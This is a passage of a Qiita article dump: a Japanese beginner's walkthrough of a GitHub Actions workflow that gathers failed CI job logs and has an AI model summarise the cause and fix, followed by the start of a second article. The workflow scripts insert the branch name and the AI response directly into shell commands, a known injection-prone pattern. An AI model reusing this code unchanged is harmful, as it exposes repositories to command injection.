frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"531:1-531:96\"><code>GITHUB_STEP_SUMMARY</code>に追加することでジョブの概要に出力することができる</p>\n<p data-sourcepos=\"533:1-533:154\"><iframe id=\"qiita-embed-content__e395e137d768d85956197662fd9b5e03\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e395e137d768d85956197662fd9b5e03\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-what-your-workflow-does%2Fevaluate-expressions-in-workflows-and-actions%23status-check-functions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"536:1-545:3\"><div class=\"highlight\"><pre><code>      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Save AI response to summary</span>\n        <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">always()</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\"># GitHub Actionsのサマリーに出力（Web UIで確認可能）</span>\n          <span class=\"s\">echo \"## 分析結果\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n\n</code></pre></div></div>\n<h1 data-sourcepos=\"547:1-547:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"548:1-549:176\">GitHub Actionsの新しいトリガーやGitHubCLI、シェルスクリプトなど新しい知識を得ることができました。<br>\n自分のリサーチだけでは今回の仕組みはできなかったです。AIの助けを借りながら知識を得ることができ、良い機会になりました。</p>\n<h1 data-sourcepos=\"551:1-551:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"553:1-553:128\"><iframe id=\"qiita-embed-content__073651d5f6524d0e45f4c0d7841b9c7b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__073651d5f6524d0e45f4c0d7841b9c7b\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-when-your-workflow-runs%2Fevents-that-trigger-workflows%23workflow_run\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"555:1-555:49\"><iframe id=\"qiita-embed-content__344a613487f599770f33c8ed4088962f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__344a613487f599770f33c8ed4088962f\" data-content=\"https%3A%2F%2Fzenn.dev%2Fkitoketa%2Farticles%2F28675c5eb1d0fb\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"558:1-558:53\"><iframe id=\"qiita-embed-content__7aa800cf8afe719a7f5c29f9a5fd2d2e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7aa800cf8afe719a7f5c29f9a5fd2d2e\" data-content=\"https%3A%2F%2Fqiita.com%2Fkite_999%2Fitems%2Fe77fb521fc39454244e7\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"560:1-560:88\"><iframe id=\"qiita-embed-content__c34c0633b25a6dc8547624b3b86a0ee9\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c34c0633b25a6dc8547624b3b86a0ee9\" data-content=\"https%3A%2F%2Fqiita.com%2FIY_LNX%2Fitems%2Fef7a1158f6084bea1bac%23%25E5%2589%258D%25E6%258F%2590%25E7%259F%25A5%25E8%25AD%2598\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"562:1-562:64\"><iframe id=\"qiita-embed-content__42b1c791849b40aced43cf163a33fbfd\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__42b1c791849b40aced43cf163a33fbfd\" data-content=\"https%3A%2F%2Fazukiazusa.dev%2Fblog%2Factions-ai-interface-github-actions%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nGitHub ActionsでCI/CDを実現できるようになった今、pushする度にワークフローがエラーとなることが多々あります。\nエラーが起きる度に原因を調べたり、AIに聞いたりしていたのですが、段々と面倒になってると感じていました。\nそこで、GitHub Actionsの`ai-inference`を使用して、エラーの原因と解消方法を自動で教えてもらうことはできないかと考え、AIと相談しながら実際に作成してみました。\n\nhttps://github.com/actions/ai-inference\n\n# 作成したワークフロー\n\nCI/CDワークフロー（test-deploy.yml）が失敗した際に、エラーログを取得し、AIが自動で解析、ジョブの概要欄にて原因と解決方法を表示してくれます。\n\nhttps://github.com/asa129/addiless-alcohol-app/actions/workflows/ai-failure-check.yml\n\n<details><summary><b>ai-failure-check.yml</b></summary>\n\n```yml:ai-failure-check.yml\nname: AI Failure check\n\non:\n  workflow_run:\n    workflows: \"Test and Deploy\"\n    types:\n      - completed\n\njobs:\n  on-success:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'success' }}\n    steps:\n      - name: success\n        run: |\n          echo \"trigger build workflow success\"\n  on-failure:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'failure' }}\n    permissions:\n      actions: read\n      contents: read\n      models: read\n    steps:\n      - name: failure\n        run: |\n          echo \"trigger build workflow failed\"\n\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Get error info\n        id: get-error\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          echo \"::error::ワークフロー失敗\"\n          echo \"branch: ${{ github.event.workflow_run.head_branch }}\"\n\n          # ワークフローの実行IDを取得\n          RUN_ID=${{ github.event.workflow_run.id }}\n          echo \"RUN_ID: $RUN_ID\"\n\n          # ワークフロー情報を環境変数に保存\n          echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" >> $GITHUB_ENV\n          echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" >> $GITHUB_ENV\n          echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" >> $GITHUB_ENV\n\n          # ジョブの一覧を取得\n          JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')\n\n          # 失敗したジョブのログを取得\n          echo \"FAILED_LOGS<<EOF\" >> $GITHUB_ENV\n\n          for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do\n            echo \"=== Job ID: $job ===\" >> $GITHUB_ENV\n            gh api repos/${{ github.repository }}/actions/jobs/${job}/logs >> $GITHUB_ENV 2>&1 || echo \"ログの取得に失敗しました\" >> $GITHUB_ENV\n            echo \"\" >> $GITHUB_ENV\n          done\n\n          echo \"EOF\" >> $GITHUB_ENV\n\n      - name: Run AI check\n        id: ai-check\n        uses: actions/ai-inference@v1\n        with:\n          model: \"openai/gpt-4o\"\n          prompt: |\n            あなたは、エラー解決のプロです。初心者に向けてわかりやすくなぜエラーになったのか、どうすればエラーを解決できるかを教えてください。\n            以下の形式で簡潔に（全体で10行以内）説明してください。\n            エラーの内容は以下です。\n\n            **失敗したワークフロー:**\n            - ワークフロー名: ${{ env.WORKFLOW_NAME }}\n            - ブランチ: ${{ env.BRANCH_NAME }}\n            - コミットSHA: ${{ env.COMMIT_SHA }}\n            - 使用技術: Vite, Supabase, Firebase\n\n            **エラーログ:**\n            ```\n            ${{ env.FAILED_LOGS }}\n            ```\n\n            **回答形式フォーマット:**\n            【原因】1-2行で説明\n            【解決方法】具体的な手順を1-2個\n            【予防策】1つだけ\n\n      - name: Save AI response to summary\n        if: always()\n        run: |\n          # GitHub Actionsのサマリーに出力（Web UIで確認可能）\n          echo \"## 分析結果\" >> $GITHUB_STEP_SUMMARY\n          echo \"\" >> $GITHUB_STEP_SUMMARY\n          echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d >> $GITHUB_STEP_SUMMARY\n\n```\n</details>\n\n\n![github.com_asa129_addiless-alcohol-app_actions_runs_15256956232.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c980ef82-f6c8-4055-b45a-2345ef1ea153.png)\n\n\n## 実際の流れ\n#### ①ワークフローエラー発生\ntest-deploy.yml実行時、project_testジョブでテストが失敗しています。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9df3a0f4-643b-4cee-a2ea-964d7d7dbde7.png)\n\n#### ②AIにてワークフローエラー解析\ntest-deploy.yml実行後、ai-failure-check.ymlのワークフローが自動で起動、エラーログを取得します。\n\n#### ③分析した結果の表示\nAI分析した結果（原因と対処方法）が概要欄に表示されます。\n\n![github.com_asa129_addiless-alcohol-app_actions_runs_15256956232.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c980ef82-f6c8-4055-b45a-2345ef1ea153.png)\n\n# 作成の過程\n## 1. ワークフロー実行後をトリガーとする新規ワークフローの作成\nワークフローの完了をトリガーに別のワークフローを実行するために、`workflow_run`を使用しました。\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#workflow_run\n\n```yml:ai-failure-check\nname: AI Failure check\n\non:\n  workflow_run:\n    workflows: \"Test and Deploy\"\n    types:\n      - completed\n\njobs:\n  on-success:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'success' }}\n    steps:\n      - name: success\n        run: |\n          echo \"trigger build workflow success\"\n  on-failure:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'failure' }}\n    steps:\n      - name: failure\n        run: |\n          echo \"trigger build workflow failed\"\n```\n\n`workflows`：トリガーにするワークフロー名\n`types:- completed`：ワークフロー実行後を指定\n\n`${{ github.event.workflow_run.conclusion == 'success' }}`：ワークフローの実行結果を取得\n\n**動作確認**\n\n下記の画像はtest-deploy.yml(ワークフロー名:Test and Deploy)実行後です。\n`job名変えたよ`のコメントでpush後、エラーなくワークフローが完了しています。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/88acd6eb-3a1f-4829-8b4b-d939379cdabd.png)\n\nその後、ai-failure-check.yml(ワークフロー名:AI Failure check)の結果を確認、Test and Deployがエラーなく完了しているため、`on-success`ジョブが実行されました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/46475b2b-3b1b-4ebb-8731-0c24432533a1.png)\n\nコンソールにもメッセージが表示されています。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/120b09d9-d3ac-4855-b249-7942e87647f2.png)\n\n\n## 2. エラーログ取得とAI解析の実装\n\n1.で作成したワークフロー失敗時に実行されるジョブ(`on-failure`)にて、以下を追加しました。\n* `permissions`：ワークフローが他のリソースなどにアクセスする際の権限設定\n* `steps`\n\n`steps`は以下を追加\n1. `failure`：コンソールに失敗した旨を表示\n1. `Checkout code`：チェックアウトとリポジトリのアクセス許可\n1. `Get error info`：エラーログの取得\n1. `Run AI check`：AIの分析\n1. `Save AI response to summay`：分析結果を表示\n\n```yml:ai-failure-check.yml\nname: AI Failure check\n\non:\n  workflow_run:\n    workflows: \"Test and Deploy\"\n    types:\n      - completed\n\njobs:\n  on-success:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'success' }}\n    steps:\n      - name: success\n        run: |\n          echo \"trigger build workflow success\"\n  on-failure:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'failure' }}\n    permissions:\n      actions: read\n      contents: read\n      models: read\n    steps:\n      - name: failure\n        run: |\n          echo \"trigger build workflow failed\"\n\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Get error info\n        id: get-error\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          echo \"::error::ワークフロー失敗\"\n          echo \"branch: ${{ github.event.workflow_run.head_branch }}\"\n\n          # ワークフローの実行IDを取得\n          RUN_ID=${{ github.event.workflow_run.id }}\n          echo \"RUN_ID: $RUN_ID\"\n\n          # ワークフロー情報を環境変数に保存\n          echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" >> $GITHUB_ENV\n          echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" >> $GITHUB_ENV\n          echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" >> $GITHUB_ENV\n\n          # ジョブの一覧を取得\n          JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')\n\n          # 失敗したジョブのログを取得\n          echo \"FAILED_LOGS<<EOF\" >> $GITHUB_ENV\n\n          for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do\n            echo \"=== Job ID: $job ===\" >> $GITHUB_ENV\n            gh api repos/${{ github.repository }}/actions/jobs/${job}/logs >> $GITHUB_ENV 2>&1 || echo \"ログの取得に失敗しました\" >> $GITHUB_ENV\n            echo \"\" >> $GITHUB_ENV\n          done\n\n          echo \"EOF\" >> $GITHUB_ENV\n\n      - name: Run AI check\n        id: ai-check\n        uses: actions/ai-inference@v1\n        with:\n          model: \"openai/gpt-4o\"\n          prompt: |\n            あなたは、エラー解決のプロです。初心者に向けてわかりやすくなぜエラーになったのか、どうすればエラーを解決できるかを教えてください。\n            以下の形式で簡潔に（全体で10行以内）説明してください。\n            エラーの内容は以下です。\n\n            **失敗したワークフロー:**\n            - ワークフロー名: ${{ env.WORKFLOW_NAME }}\n            - ブランチ: ${{ env.BRANCH_NAME }}\n            - コミットSHA: ${{ env.COMMIT_SHA }}\n            - 使用技術: Vite, Supabase, Firebase\n\n            **エラーログ:**\n            ```\n            ${{ env.FAILED_LOGS }}\n            ```\n\n            **回答形式フォーマット:**\n            【原因】1-2行で説明\n            【解決方法】具体的な手順を1-2個\n            【予防策】1つだけ\n\n      - name: Save AI response to summary\n        if: always()\n        run: |\n          # GitHub Actionsのサマリーに出力（Web UIで確認可能）\n          echo \"## 分析結果\" >> $GITHUB_STEP_SUMMARY\n          echo \"\" >> $GITHUB_STEP_SUMMARY\n          echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d >> $GITHUB_STEP_SUMMARY\n\n```\n\n### permissions\n\n`permissions`：ワークフローがGitHubのリソースやAPIにアクセスする際の権限を設定する\n\n```yml\npermissions:\n      actions: read\n      contents: read\n      models: read\n```\n\n\n**公式ドキュメントより引用**\n>permissions を使用して GITHUB_TOKEN に付与された既定のアクセス許可を変更し、必要に応じてアクセスを追加または削除することで、必要最小限のアクセスのみを許可することができます。\nread (該当する場合)、write、または none のいずれかのアクセス レベルを割り当てることができます。\n>>`actions`:GitHub Actions を操作します。\n`contents`:リポジトリの内容を操作します。\n`models`:GitHub Models を使用して AI 推論応答を生成します。たとえば、models: read は、GitHub Models 推論 API を使用するアクションを許可します。\n\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token\n\n### steps\n#### name: failure\nコンソール上に`trigger build workflow failed`を表示する\n\n```yml\n    steps:\n      - name: failure\n        run: |\n          echo \"trigger build workflow failed\"\n```\n\n#### name: Checkout code\nチェックアウトとリポジトリのアクセスをできるようにする\n\n```yml\n      - name: Checkout code\n        uses: actions/checkout@v4\n```\n\n**READMEより引用**\n>このアクションは$GITHUB_WORKSPACE配下のリポジトリをチェックアウトし、ワークフローがリポジトリにアクセスできるようにします。\n\nhttps://github.com/actions/checkout\n\n#### name: Get error info\n\n:::note info\n以下の方法は、ログを全て取得するため、ログの出力が大きいとエラーになります。\n解決方法を下記にまとめていますのでご参照ください。\n:::\n\n\nhttps://qiita.com/asa129/items/adc4a8e7782e89d4d524\n\n\n\n`id`:ステップの一意な識別子\n\n```yml\n- name: Get error info\n        id: get-error\n```\n\n\nhttps://docs.github.com/ja/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsid\n\n`env`:ワークフロー内で使用できる変数を定義\n\n```yml\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n```\n\n**公式ドキュメントより引用**\n>env：ワークフロー中のすべてのジョブのステップで使うことができる変数の map です\n\nhttps://docs.github.com/ja/actions/writing-workflows/workflow-syntax-for-github-actions#env\n\n`GITHUB_TOKEN`はワークフロー開始時に自動で作成してくれます。\n`${{ secrets.GITHUB_TOKEN }} `で定義し、使用します。\n\n>各ワークフロー ジョブの開始時に、GitHub によって、ワークフローで使用する一意の GITHUB_TOKEN シークレットが自動的に作成されます。\n>>${{ secrets.GITHUB_TOKEN }} を使って、GITHUB_TOKEN を使用できます。\n\nhttps://docs.github.com/ja/actions/security-for-github-actions/security-guides/automatic-token-authentication\n\n##### ワークフローの実行IDを取得\n\n`github.event.workflow_run.~`：`workflow_run:`で指定したワークフロー情報（今回の場合は`Test and Deploy`の実行結果を格納してくれる）\n`head_branch`:実行されたブランチ名\n`id `:ワークフロー実行ID\n\n```yml\n        run: |\n          echo \"::error::ワークフロー失敗\"\n          echo \"branch: ${{ github.event.workflow_run.head_branch }}\"\n\n          # ワークフローの実行IDを取得\n          RUN_ID=${{ github.event.workflow_run.id }}\n          echo \"RUN_ID: $RUN_ID\"\n```\n\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#workflow_run\n\nhttps://docs.github.com/ja/webhooks/webhook-events-and-payloads#workflow_run\n\n##### ワークフロー情報を環境変数に保存\n\n`github.event.workflow_run.~`：`workflow_run:`で指定したワークフロー情報（今回の場合は`Test and Deploy`の実行結果を格納してくれる）\n`name`:ワークフロー名\n`head_branch`:実行されたブランチ名\n`head_sha`:コミットしたときのハッシュ値\n\n`echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" >> $GITHUB_ENV`\n\n`>>`：ファイルに追記するシェルコマンド(`>`の場合は上書き)\n\n1. `$GITHUB_ENV`ファイルを作成、`WORKFLOW_NAME=${{ github.event.workflow_run.name }}`を記載、保存\n2. `WORKFLOW_NAME=${{ github.event.workflow_run.head_branch }}`を追記\n3. `WORKFLOW_NAME=${{ github.event.workflow_run.head_sha }}`を追記\n\n```yml\n          # ワークフロー情報を環境変数に保存\n          echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" >> $GITHUB_ENV\n          echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" >> $GITHUB_ENV\n          echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" >> $GITHUB_ENV\n```\n\n##### ジョブの一覧を取得\n\n**GitHub CLI(gh)を使ってapiを呼び出す**\n\n`gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs`\n\n```yml\n          # ジョブの一覧を取得\n          JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')\n```\n\n`gh`: GitHub CLIを使用するコマンド\n`api`: APIを呼び出す\n`repos/\\\\${{ github.repository }}/actions/runs/${RUN_ID}/jobs`: エンドポイント、実行したワークフローのjobを取得\n\nhttps://docs.github.com/ja/github-cli/github-cli/about-github-cli\n\nhttps://cli.github.com/manual/gh_api\n\n##### 失敗したジョブのログを取得\n\n```yml\n          # 失敗したジョブのログを取得\n          echo \"FAILED_LOGS<<EOF\" >> $GITHUB_ENV\n\n          for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do\n            echo \"=== Job ID: $job ===\" >> $GITHUB_ENV\n            gh api repos/${{ github.repository }}/actions/jobs/${job}/logs >> $GITHUB_ENV 2>&1 || echo \"ログの取得に失敗しました\" >> $GITHUB_ENV\n            echo \"\" >> $GITHUB_ENV\n          done\n\n          echo \"EOF\" >> $GITHUB_ENV\n```\n\n`echo \"FAILED_LOGS<<EOF\" >> $GITHUB_ENV`:$GITHUB_ENVファイルにFAILED_LOGS<<EOFを追記\n`FAILED_LOGS<<EOF`：環境変数FAILED_LOGSを設定\n`<<EOF`:ヒアドキュメント、EOFという文字列が現れるまで、複数行の値として扱う\n```yml\n          for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do\n            echo \"=== Job ID: $job ===\" >> $GITHUB_ENV\n            gh api repos/${{ github.repository }}/actions/jobs/${job}/logs >> $GITHUB_ENV 2>&1 || echo \"ログの取得に失敗しました\" >> $GITHUB_ENV\n            echo \"\" >> $GITHUB_ENV\n          done\n\n          echo \"EOF\" >> $GITHUB_ENV\n```\n\n`$JOBS`：ジョブ一覧を格納\n`jq -r '.[]`：`jq` jsonを取り扱うコマンド、`-r` オプションを直接取り扱う、`.[]`JSON配列の各要素をループして取り出す\n`select(.conclusion == \"failure\")`:conclusionが\"failure\"のもののみ取得\n`.id`：idだけ取り出す\n取り出したものは`job`に格納\n\n`echo \"=== Job ID: $job ===\" >> $GITHUB_ENV`：=== Job ID: $job ===取り出したjob(id)をGITHUB_ENVに追記\n\n`gh api repos/${{ github.repository }}/actions/jobs/${job}/logs >> $GITHUB_ENV 2>&1 || echo \"ログの取得に失敗しました\" >> $GITHUB_ENV`\nidのlogsをGITHUB_ENVに追記、`2>&1`は2は標準エラー出力、>&1は標準出力にリダイレクトする（エラーメッセージも通常の出力としてファイルに書き込む）\n|| はOR演算子、左側のコマンドが失敗したら（false）の右側の処理を行う\n\n` |`：YAMLの複数行記法\n\n#### name: Run AI check\n\n`uses`: `actions/ai-inference@v1`を指定\n  `model`: AIのモデルを指定\n  `prompt`:プロンプトを指定\n\n```yml\n      - name: Run AI check\n        id: ai-check\n        uses: actions/ai-inference@v1\n        with:\n          model: \"openai/gpt-4o\"\n          prompt: |\n            あなたは、エラー解決のプロです。初心者に向けてわかりやすくなぜエラーになったのか、どうすればエラーを解決できるかを教えてください。\n            以下の形式で簡潔に（全体で10行以内）説明してください。\n            エラーの内容は以下です。\n\n            **失敗したワークフロー:**\n            - ワークフロー名: ${{ env.WORKFLOW_NAME }}\n            - ブランチ: ${{ env.BRANCH_NAME }}\n            - コミットSHA: ${{ env.COMMIT_SHA }}\n            - 使用技術: Vite, Supabase, Firebase\n\n            **エラーログ:**\n            ```\n            ${{ env.FAILED_LOGS }}\n            ```\n\n            **回答形式フォーマット:**\n            【原因】1-2行で説明\n            【解決方法】具体的な手順を1-2個\n            【予防策】1つだけ\n```\n\n#### name: Save AI response to summary\n\n`if: always()`前のステップに関係なくステップを実行できる\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions#status-check-functions\n\n`GITHUB_STEP_SUMMARY`に追加することでジョブの概要に出力することができる\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions#status-check-functions\n\n\n```yml\n      - name: Save AI response to summary\n        if: always()\n        run: |\n          # GitHub Actionsのサマリーに出力（Web UIで確認可能）\n          echo \"## 分析結果\" >> $GITHUB_STEP_SUMMARY\n          echo \"\" >> $GITHUB_STEP_SUMMARY\n          echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d >> $GITHUB_STEP_SUMMARY\n\n```\n\n# おわりに\nGitHub Actionsの新しいトリガーやGitHubCLI、シェルスクリプトなど新しい知識を得ることができました。\n自分のリサーチだけでは今回の仕組みはできなかったです。AIの助けを借りながら知識を得ることができ、良い機会になりました。\n\n# 参考\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#workflow_run\n\nhttps://zenn.dev/kitoketa/articles/28675c5eb1d0fb\n\n\nhttps://qiita.com/kite_999/items/e77fb521fc39454244e7\n\nhttps://qiita.com/IY_LNX/items/ef7a1158f6084bea1bac#%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AD%98\n\nhttps://azukiazusa.dev/blog/actions-ai-interface-github-actions/\n","coediting":false,"comments_count":0,"created_at":"2025-06-01T09:55:04+09:00","group":null,"id":"cc271dd791667844f1a5","likes_count":16,"private":false,"reactions_count":0,"stocks_count":10,"tags":[{"name":"初心者","versions":[]},{"name":"AI","versions":[]},{"name":"CICD","versions":[]},{"name":"GitHubActions","versions":[]}],"title":"【GitHub Actions + CI/CD】AIがワークフローエラーの解決方法を教えてくれる仕組みを作ってみた","updated_at":"2025-06-04T23:15:06+09:00","url":"https://qiita.com/asa129/items/cc271dd791667844f1a5","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":11807,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:135\">スマートフォンでの使用を想定したデジタル名刺アプリを作成しました。<br>\n0→1で何かを作れるようになることを目標にして3か月半、開発中に得た気づきをまとめてみました。</p>\n<h1 data-sourcepos=\"5:1-5:17\">\n<span id=\"作ったもの\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E3%81%A3%E3%81%9F%E3%82%82%E3%81%AE\"><i class=\"fa fa-link\"></i></a>作ったもの</h1>\n<ul data-sourcepos=\"7:1-10:0\">\n<li data-sourcepos=\"7:1-7:73\">IDを使用して、デジタル名刺を管理できるアプリです</li>\n<li data-sourcepos=\"8:1-8:83\">名前、自己紹介を管理、GitHub・Qiita・Xへ容易に遷移できます</li>\n<li data-sourcepos=\"9:1-10:0\">スマートフォンでの使用を想定</li>\n</ul>\n<p data-sourcepos=\"11:1-11:151\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79e55d5a-610b-47ab-879d-c8f2745264ce.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e6cef6c9bfce53fe5b89e67f6aa62518\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79e55d5a-610b-47ab-879d-c8f2745264ce.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e6cef6c9bfce53fe5b89e67f6aa62518\" alt=\"画面録画 2025-05-15 210306 (1).gif\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79e55d5a-610b-47ab-879d-c8f2745264ce.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ce2725dbb4e559a026ad96694a666afd 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/79e55d5a-610b-47ab-879d-c8f2745264ce.gif\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"13:1-13:43\"><iframe id=\"qiita-embed-content__529298157ae80b857a5d6c77767c4733\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__529298157ae80b857a5d6c77767c4733\" data-content=\"https%3A%2F%2Fgithub.com%2Fasa129%2Fbusiness-card-app\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"16:1-16:17\">\n<span id=\"作ってみて\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%A6\"><i class=\"fa fa-link\"></i></a>作ってみて</h1>\n<h2 data-sourcepos=\"17:1-17:40\">\n<span id=\"clap-過去の記事に救われた\" class=\"fragment\"></span><a href=\"#clap-%E9%81%8E%E5%8E%BB%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%AB%E6%95%91%E3%82%8F%E3%82%8C%E3%81%9F\"><i class=\"fa fa-link\"></i></a><img alt=\":clap:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f44f.png\" title=\":clap:\" width=\"20\" loading=\"lazy\"> 過去の記事に救われた</h2>\n<p data-sourcepos=\"18:1-18:76\">開発中、何度も<strong>過去の記事に救われた</strong>と感じました。</p>\n<p data-sourcepos=\"20:1-20:221\">今回の名刺アプリでも、DBはSupabase、CI/CDの構築、Jest＋ReactTestingLibraryでのテスト実装など、以前作った学習記録アプリで使用した技術を使用して開発を行いました。</p>\n<p 